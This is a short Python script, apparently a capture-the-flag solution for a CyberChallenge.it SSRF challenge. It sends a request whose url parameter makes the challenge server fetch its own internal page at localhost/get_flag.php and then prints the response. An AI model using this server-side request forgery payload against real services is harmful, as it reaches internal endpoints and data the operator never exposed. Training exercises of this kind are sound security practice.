#!/usr/bin/env python3

import requests

headers = {
    "Content-Security-Policy": "default-src 'none'; style-src cdnjs.cloudflare.com"
}

response = requests.get("http://ssrf1.challs.cyberchallenge.it/?url=http%3A%2F%2Flocalhost%2Fget_flag.php", headers=headers)
print("Status Code:", response.status_code)
print(response.text)